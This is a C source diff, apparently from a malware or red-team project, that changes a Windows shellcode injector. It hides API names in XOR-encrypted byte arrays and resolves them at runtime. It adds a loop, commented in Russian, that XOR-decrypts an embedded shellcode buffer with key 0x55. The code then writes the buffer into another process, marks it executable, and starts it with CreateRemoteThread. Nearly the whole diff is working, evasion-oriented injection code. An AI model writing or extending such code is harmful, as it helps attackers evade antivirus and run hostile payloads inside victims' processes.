@@ -31,13 +31,19 @@ int main(int argc, char *argv[])
 		GetModuleHandleA("kernel32.dll"),
 		decrypt(encOpenProcess, sizeof(encOpenProcess))
 	);
-
+	
 	unsigned char encVirtualAllocEx[] = {0x03, 0x3c, 0x27, 0x21, 0x20, 0x34, 0x39, 0x14, 0x39, 0x39, 0x3a, 0x36, 0x10, 0x2d};
 	pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(
 		GetModuleHandleA("kernel32.dll"),
 		decrypt(encVirtualAllocEx, sizeof(encVirtualAllocEx))
 	);
-
+	
+	// расшифровка массива шелкода
+	for (int i = 0; i < icon_enc_bin_len; i++)
+	{
+		icon_enc_bin[i] ^= 0x55;
+	}
+	
 	unsigned char encWriteProcessMemory[] = {0x02, 0x27, 0x3c, 0x21, 0x30, 0x05, 0x27, 0x3a, 0x36, 0x30, 0x26, 0x26, 0x18, 0x30, 0x38, 0x3a, 0x27, 0x2c};
 	pWriteProcessMemory myWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(
 		GetModuleHandleA("kernel32.dll"),
@@ -60,15 +66,15 @@ int main(int argc, char *argv[])
 	HANDLE hProcess = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (!hProcess){return 1;}
 
-	LPVOID remoteBuffer = myVirtualAllocEx(hProcess, NULL, icon_bin_len,  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	LPVOID remoteBuffer = myVirtualAllocEx(hProcess, NULL, icon_enc_bin_len,  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (!remoteBuffer){return 1;}
 
-	BOOL write = myWriteProcessMemory(hProcess, remoteBuffer, icon_bin, icon_bin_len, NULL);
+	BOOL write = myWriteProcessMemory(hProcess, remoteBuffer, icon_enc_bin, icon_enc_bin_len, NULL);
 	if (!write){return 1;}
 
 	DWORD oldProtect;
 
-	BOOL perm = myVirtualProtectEx(hProcess, remoteBuffer, icon_bin_len, PAGE_EXECUTE_READ, &oldProtect);
+	BOOL perm = myVirtualProtectEx(hProcess, remoteBuffer, icon_enc_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 	if (!perm){return 1;}
 
 	HANDLE thread = myCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
